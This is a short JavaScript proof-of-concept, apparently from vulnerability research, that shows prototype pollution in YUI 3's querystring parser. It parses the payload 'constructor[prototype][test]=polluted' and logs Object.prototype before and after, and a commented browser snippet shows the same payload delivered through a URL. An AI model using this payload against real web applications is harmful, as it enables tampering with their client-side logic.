//<script src="https://cdnjs.cloudflare.com/ajax/libs/yui/3.18.1/yui/yui-min.js"></script>
//    <script>
//    YUI().use('querystring', function (Y) {
//            Y.QueryString.parse(location.search.slice(1));
//    });
//</script>
//
//
//?constructor[prototype][test]=test

import * as yui from "./yui3.js";

const payload = "constructor[prototype][test]=polluted";
console.log({}.test);
yui.parse(payload);
console.log({}.test);
